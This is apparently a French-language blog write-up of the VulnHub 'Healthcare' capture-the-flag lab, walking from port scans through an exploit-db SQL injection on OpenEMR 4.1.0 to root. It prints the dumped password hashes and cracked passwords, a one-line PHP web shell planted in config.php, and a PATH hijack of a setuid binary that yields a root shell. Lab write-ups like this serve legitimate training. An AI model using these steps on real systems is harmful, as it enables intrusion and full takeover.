# Solution du CTF Healthcare de VulnHub

[Healthcare](https://vulnhub.com/entry/healthcare-1,522/) est un CTF proposé sur VulnHub et créé par [v1n1v131r4](https://twitter.com/v1n1v131r4).

```
Nmap scan report for 192.168.56.65
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-title: Coming Soon 2
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
```

Le dossier `addon-modules` existe bien mais retourne le message *This directory can only be viewed from localhost.*

## Same Player Shoot Again

Feroxbuster trouve quelques dossiers supplémentaires :

```
301        9l       29w      342c http://192.168.56.65/images
200      121l      281w     5031c http://192.168.56.65/index
301        9l       29w      341c http://192.168.56.65/fonts
403        1l        4w       59c http://192.168.56.65/phpMyAdmin
301        9l       29w      338c http://192.168.56.65/js
301        9l       29w      342c http://192.168.56.65/vendor
200       19l       78w      620c http://192.168.56.65/robots
301        9l       29w      339c http://192.168.56.65/css
403        1l        8w       49c http://192.168.56.65/addon-modules
200        2l       14w     1406c http://192.168.56.65/favicon
403       42l       96w        0c http://192.168.56.65/server-status
200      121l      281w     5031c http://192.168.56.65/
301        9l       29w      342c http://192.168.56.65/gitweb
403       42l       96w        0c http://192.168.56.65/server-info
403        1l        4w       55c http://192.168.56.65/perl-status
```

On voit la mention de gitweb et d'ailleurs si je demande `/cgi-bin/gitweb.cgi` le fichier est présent mais j'obtiens une erreur 500... pas vraiment ce que j'espérait.

Tout semblait plutôt mal barré puis j'ai relancé la recherche aec la wordlist `directory-list-2.3-big.txt` qui a trouvé un dossier supplémentaire :

`http://192.168.56.65/openemr`

Il s'agit d'une install de OpenEMR, déjà croisé sur [le CTF DriftingBlues 8 de HackMyVM](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20DriftingBlues%208%20de%20HackMyVM.md#so-long-and-thank-for-all-the-wordlists). Ici le logiciel affiche sa version : 4.1.0.

Ca tombe bien car il y a justement [une injection SQL](https://www.exploit-db.com/exploits/49742) qui touche cette version. Ainsi si je donne un apostrophe en paramètre au script vulnérable, jobtiens :

> ERROR: query failed: select password,length(password) as passlength from users where username = '''
> 
> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

L'exploit présent sur exploit-db fonctionne très bien mais est un peu long en raison de l'utilisation de la technique de temporisation (time based blind sql injection).

```shellsession
$ python3 49742.py 

   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

Je passe les hashs sur crackstation.net et j'obtiens respectivement `ackbar` et `medical`.

Une fois connecté en tant qu'administrateur j'ai suivi la même technique que pour *DriftingBlues 8* à savoir aller dans `Administration > Files` puis rajouter la ligne suivante au fichier `config.php` :

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

Une fois [GitHub - Fahrj/reverse-ssh: Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh) uploadé sur la VM, je me rend compte que le système ne peut pas exécuter le binaire. Un petit `uname` permet de voir que le système est en 32 bits contrairement à ce que prétendait l'image VirtualBox.

Heureusement reverse-ssh fournit aussi un binaire 32 bits qui peut communiquer avec son penchant 64 bits :)

On trouve trois dossier sous `/home` mais seulement le premier doit être intéressant :

```
drwxr-xr-x 27 almirant almirant 4096 Jul 29  2020 almirant
drwxr-xr-x 31 medical  medical  4096 Nov  5  2011 medical
drwxr-xr-x  3 root     root     4096 Nov  4  2011 mysql
```

J'y trouve d'ailleurs le premier flag (`d41d8cd98f00b204e9800998ecf8427e`).

## Healthshell

Le système a une liste assez longue de binaires setuid :

```shellsession
bash-4.1$ find / -type f -perm -u+s -ls 2> /dev/null 
147863   12 -rwsr-xr-x   1 root     root         9564 Sep  3  2011 /usr/libexec/pt_chown
147695  236 -rws--x--x   1 root     root       238352 Sep  8  2011 /usr/lib/ssh/ssh-keysign
145819    8 -rwsr-xr-x   1 root     polkituser     5748 Apr  5  2010 /usr/lib/polkit-resolve-exe-helper
145811   12 -rwsr-xr-x   1 root     root         9108 Aug 29  2011 /usr/lib/polkit-1/polkit-agent-helper-1
139126   12 -rwsr-xr-x   1 root     root         9940 Nov  2  2011 /usr/lib/chromium-browser/chrome-sandbox
145817    8 -rwsr-xr--   1 root     polkituser     7580 Apr  5  2010 /usr/lib/polkit-grant-helper-pam
145821   16 -rwsr-xr-x   1 polkituser root        16356 Apr  5  2010 /usr/lib/polkit-set-default-helper
147975   12 -rwsr-xr-x   1 root     root        10757 Jun 11  2011 /usr/sbin/fileshareset
148146   12 -rwsr-xr-x   1 root     root        12036 Nov 28  2010 /usr/sbin/traceroute6
148168   12 -rwsr-xr-x   1 root     root        10713 Aug  2  2011 /usr/sbin/usernetctl
148166   36 -rwsr-xr-x   1 root     root        33324 Nov  9  2009 /usr/sbin/userhelper
136381   40 -rwsr-sr-x   1 root     root        39020 Jun 26  2011 /usr/bin/crontab
136286   44 -rwsr-sr-x   1 daemon   daemon      41036 Jan 19  2010 /usr/bin/at
137295   32 -rwsr-xr-x   1 root     root        28916 Dec 28  2010 /usr/bin/pumount
136305    4 -rwsr-sr-x   1 daemon   daemon        137 Jan 19  2010 /usr/bin/batch
136529   16 -rwsr-xr-x   1 root     root        15848 Jan  9  2010 /usr/bin/expiry
137125   32 -rws--x--x   1 root     root        28752 Jan  9  2010 /usr/bin/newgrp
137230   20 -rwsr-xr-x   1 root     root        16920 Aug 29  2011 /usr/bin/pkexec
137590  120 -rwsr-xr-x   1 root     root       122188 Nov 28  2010 /usr/bin/wvdial
137249   40 -rwsr-xr-x   1 root     root        39488 Dec 28  2010 /usr/bin/pmount
137440   64 -rws--x--x   1 root     root        63752 Jan 23  2010 /usr/bin/sperl5.10.1
136717  364 -rwsr-xr-x   1 root     root       370648 Jan 18  2011 /usr/bin/gpgsm
136708   56 -rwsr-xr-x   1 root     root        56100 Jan  9  2010 /usr/bin/gpasswd
136347   16 -rws--x--x   1 root     root        12400 Nov 16  2010 /usr/bin/chfn
137462   32 -r-sr-xr-x   1 root     root        31144 Nov 16  2010 /usr/bin/su
137181   24 -r-s--x--x   1 root     shadow      20512 Jan 30  2010 /usr/bin/passwd
136709  936 -rwsr-xr-x   1 root     root       956252 Oct 18  2010 /usr/bin/gpg
132151    8 -rwsr-sr-x   1 root     root         5813 Jul 29  2020 /usr/bin/healthcheck
136247    8 -rwsr-xr-x   1 root     root         5852 Sep 22  2011 /usr/bin/Xwrapper
137222   36 -rwsr-xr-x   1 root     root        35128 Nov 28  2010 /usr/bin/ping6
136351   12 -rws--x--x   1 root     root        11664 Nov 16  2010 /usr/bin/chsh
   172  308 -rwsr-x---   1 root     messagebus   314400 Sep 29  2011 /lib/dbus-1/dbus-daemon-launch-helper
136122   12 -rwsr-xr-x   1 root     root        11114 Jul  6  2011 /sbin/pam_timestamp_check
   123   36 -rwsr-xr-x   1 root     root        34848 Nov 28  2010 /bin/ping
    83   28 -rwsr-xr-x   1 root     root        26360 Oct 18  2011 /bin/fusermount
   144   32 -rwsr-xr-x   1 root     root        31144 Nov 16  2010 /bin/su
   111   80 -rwsr-xr-x   1 root     root        80748 Nov 16  2010 /bin/mount
   152   32 -rwsr-xr-x   1 root     root        31180 Nov 16  2010 /bin/umount
```

Certains ne me parlent pas et d'autres semblent vraiment louches (comme `gpg`) mais c'est surtout le `healthcheck` qui me semble inhabituel.

Un coup de strings suffit pour me convaincre qu'il s'agit d'un binaire custom :

```shellsession
bash-4.1$ strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

C'est du très classique, on va exploiter le fait que ce programme privilégié lance des exécutables avec des paths relatifs et non absolus :

```shellsession
bash-4.1$ cd /tmp/
bash-4.1$ cp /bin/dash ifconfig
bash-4.1$ export PATH=.:$PATH
bash-4.1$ /usr/bin/healthcheck
'xterm-256color': unknown terminal type.
System Health Check

Scanning System
# id
uid=0(root) gid=0(root) groups=0(root),416(apache)
# cd /root
# ls
Desktop  Documents  drakx  healthcheck  healthcheck.c  root.txt  sudo.rpm  tmp
# cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
```

*Publié le 19 novembre 2022*


